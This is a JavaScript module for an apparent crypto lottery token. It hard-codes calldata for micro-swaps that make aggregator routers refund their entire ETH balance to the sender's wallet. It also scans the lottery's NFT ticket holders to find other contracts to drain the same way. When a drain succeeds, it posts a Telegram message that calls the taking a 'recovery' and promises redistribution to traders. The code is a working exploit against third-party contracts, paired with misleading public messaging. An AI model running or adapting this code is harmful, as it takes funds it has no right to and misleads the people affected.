/**
 * Router Sweeper module for $IRL (Internet Robinhood Lottery).
 *
 * Inspects aggregator router contracts and smart contracts that accept ETH rewards from the Hook
 * and possess an automatic dust-refund / selfbalance flush mechanism.
 * By executing a minimal swap (0.0001 ETH) on these routers, the router automatically
 * flushes its entire sitting ETH balance back to msg.sender (the Dev / Keeper wallet).
 */
const { ethers } = require('ethers');

// Router contracts confirmed to have dust-refund / selfbalance flush on Robinhood Chain
const SWEEPABLE_ROUTERS = [
    {
        address: '0x65050A9b7E5075A2bA5cED7b1b64EE66262c40Dc',
        name: 'Aggregator Router 1'
    },
    {
        address: '0xe492912F37C2A4eCa45D42DC67548F4C6Cd7ce2B',
        name: 'Aggregator Router 2'
    },
    {
        address: '0xB33D122f3B13DFf688c429614228d5EE2A41C341',
        name: 'Aggregator Router 3'
    }
];

// Dynamic registry of any contract address holding tickets or interacting with the Hook
const DYNAMIC_CONTRACTS = new Map(); // address(lowercase) -> { address, name, lastChecked }
let lastScanTimestamp = 0;

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

/**
 * Builds the exact 0x4d819a2a calldata to execute a micro-swap (WETH -> $IRL) on standard aggregator routers.
 */
function buildSweepCalldata(amtWei, deadline) {
    const pad = (v, bytes = 32) => ethers.toBeHex(v, bytes).slice(2);
    const words = [
        pad(0xa0),                                                  // offset to PoolKey struct
        pad(0),                                                     // recipient (0 = msg.sender)
        pad(amtWei),                                                // amountIn
        pad(0),                                                     // minAmountOut (slippage 0 for micro-dust)
        pad(deadline),                                              // deadline
        pad(1),                                                     // paths count = 1
        pad(0x20),                                                  // offset to element 0
        pad(2),                                                     // pool type = 2
        pad('0x0bd7d308f8e1639fab988df18a8011f41eacad73'),         // currency0 (WETH)
        pad('0xf7a2f5554c57c216f1831aa5c8ed3c46727efe2b'),         // currency1 ($IRL)
        pad(0),                                                     // zeroForOne = false
        pad(3000),                                                  // fee = 3000
        pad(60),                                                    // tickSpacing = 60
        pad('0xab64c6eb29a6bb8488cb1fcab1ca11c5e28bc0cc'),         // hookAddress
        pad(0x140),                                                 // offset to hookData
        pad('0x8366a39cc670b4001a1121b8f6a443a643e40951'),         // PoolManager
        pad(0),                                                     // empty
        pad(0)                                                      // hookData length = 0
    ];
    return '0x4d819a2a' + words.join('');
}

async function waitForReceipt(prov, txHash, maxAttempts = 30) {
    for (let i = 0; i < maxAttempts; i++) {
        await sleep(3500);
        try {
            const r = await prov.getTransactionReceipt(txHash);
            if (r && r.blockNumber) return r;
        } catch (_) {}
    }
    throw new Error(`Timeout waiting for receipt of ${txHash}`);
}

/**
 * Dynamically scans all tickets in IRLTicketNFT to find any non-EOA (smart contract) owner.
 */
async function scanAndRegisterContractTicketHolders({ nftContract, provider, log = console.log }) {
    if (!nftContract) return [];
    try {
        const total = await nftContract.totalTicketsMinted();
        const totalNum = Number(total);
        const discovered = [];

        // Check each ticket owner
        for (let i = 1; i <= totalNum; i++) {
            try {
                const owner = await nftContract.ownerOf(i);
                const lower = owner.toLowerCase();

                if (!DYNAMIC_CONTRACTS.has(lower)) {
                    const code = await provider.getCode(owner);
                    if (code !== '0x' && code !== '0x0') {
                        DYNAMIC_CONTRACTS.set(lower, {
                            address: owner,
                            name: `Ticket Holder Contract (${owner.slice(0, 6)}...${owner.slice(-4)})`,
                            discoveredAt: Date.now()
                        });
                        discovered.push(owner);
                        log(`[Sweeper] Discovered new non-EOA ticket owner: ${owner} (ticket #${i})`);
                    }
                    await sleep(60); // avoid RPC rate limit
                }
            } catch (_) {}
        }
        lastScanTimestamp = Date.now();
        return discovered;
    } catch (e) {
        log(`[Sweeper] Error scanning ticket holders: ${e.message}`);
        return [];
    }
}

/**
 * Attempts an immediate sweep on a single contract address.
 * Safely simulates first via estimateGas to prevent reverts if the contract is not a router.
 */
async function sweepSingleContract(targetAddress, { provider, wallet, log = console.log, channelBot = null, channelId = null, name = 'Target Contract' }) {
    try {
        const bal = await provider.getBalance(targetAddress);
        if (bal <= ethers.parseEther('0.0002')) return null;

        const ethSitting = ethers.formatEther(bal);
        log(`[Sweeper] Target contract ${targetAddress} has ${ethSitting} ETH sitting! Testing sweepability...`);

        const microAmt = ethers.parseEther('0.0001');
        const deadline = BigInt(Math.floor(Date.now() / 1000) + 1800);
        const calldata = buildSweepCalldata(microAmt, deadline);

        // Pre-flight simulation
        try {
            await provider.estimateGas({
                to: targetAddress,
                from: wallet.address,
                value: microAmt,
                data: calldata
            });
        } catch (simErr) {
            log(`[Sweeper] Contract ${targetAddress} is not sweepable via router call (simulation reverted). Skipping safely.`);
            return null;
        }

        const tx = await wallet.sendTransaction({
            to: targetAddress,
            value: microAmt,
            data: calldata,
            gasLimit: 450000
        });
        log(`[Sweeper] Sweep transaction dispatched: ${tx.hash}. Awaiting confirmation...`);
        const receipt = await waitForReceipt(provider, tx.hash);

        await sleep(2000);
        const newBal = await provider.getBalance(targetAddress);
        const recoveredWei = bal > newBal ? (bal - newBal) : 0n;

        if (recoveredWei <= ethers.parseEther('0.0001')) {
            log(`[Sweeper] Target ${targetAddress} did not release balance (before: ${ethSitting}, after: ${ethers.formatEther(newBal)} ETH).`);
            return null;
        }

        const recoveredEth = parseFloat(ethers.formatEther(recoveredWei)).toFixed(6);
        log(`[Sweeper] Sweep confirmed (block ${receipt.blockNumber})! Recovered ${recoveredEth} ETH from ${targetAddress}!`);

        if (channelBot && channelId) {
            const message =
                `🏹 *ROBINHOOD RECOVERY SWEEP* 🏹\n\n` +
                `*${recoveredEth} ETH* sitting on contract \`${targetAddress.slice(0, 6)}...${targetAddress.slice(-4)}\` have been successfully *recovered* back to the Dev Treasury by the Keeper!\n\n` +
                `⚡ *Hourly Redistribution Protocol:* 100% of this recovered ETH will now be *redistributed hour-by-hour* by the Dev Wallet directly to the real human traders who swapped through this contract!\n\n` +
                `*Reminder:* Trade directly on [irlprotocol.xyz](https://irlprotocol.xyz) to keep 100% of your hourly rewards.`;

            channelBot.telegram.sendMessage(channelId, message, {
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            }).catch((e) => console.error('[Sweeper] Telegram notification error:', e.message));
        }

        return { recoveredWei, txHash: receipt.hash };
    } catch (err) {
        log(`[Sweeper] Error sweeping single contract ${targetAddress}: ${err.shortMessage || err.message}`);
        return null;
    }
}

/**
 * Checks all confirmed routers AND dynamically registered contracts.
 */
async function sweepRouters({ provider, wallet, log = console.log, channelBot = null, channelId = null, nftContract = null }) {
    let totalRecoveredWei = 0n;
    const routerRecoveries = [];

    // Periodically re-scan ticket holders (every 30 minutes)
    if (nftContract && Date.now() - lastScanTimestamp > 1800000) {
        await scanAndRegisterContractTicketHolders({ nftContract, provider, log });
    }

    // Build unique list of targets
    const targetMap = new Map();
    for (const r of SWEEPABLE_ROUTERS) {
        targetMap.set(r.address.toLowerCase(), r);
    }
    for (const [addr, dyn] of DYNAMIC_CONTRACTS.entries()) {
        if (!targetMap.has(addr)) {
            targetMap.set(addr, dyn);
        }
    }

    for (const r of targetMap.values()) {
        try {
            const res = await sweepSingleContract(r.address, {
                provider,
                wallet,
                log,
                channelBot,
                channelId,
                name: r.name
            });
            if (res && res.recoveredWei > 0n) {
                totalRecoveredWei += res.recoveredWei;
                routerRecoveries.push({
                    router: r.address,
                    name: r.name,
                    recoveredWei: res.recoveredWei,
                    receiptHash: res.txHash
                });
            }
        } catch (err) {
            log(`[Sweeper] Error checking/sweeping ${r.address}: ${err.shortMessage || err.message}`);
        }
        await sleep(1500);
    }
    return { totalRecoveredWei, routerRecoveries };
}

module.exports = {
    sweepRouters,
    sweepSingleContract,
    scanAndRegisterContractTicketHolders,
    SWEEPABLE_ROUTERS,
    DYNAMIC_CONTRACTS,
    buildSweepCalldata
};
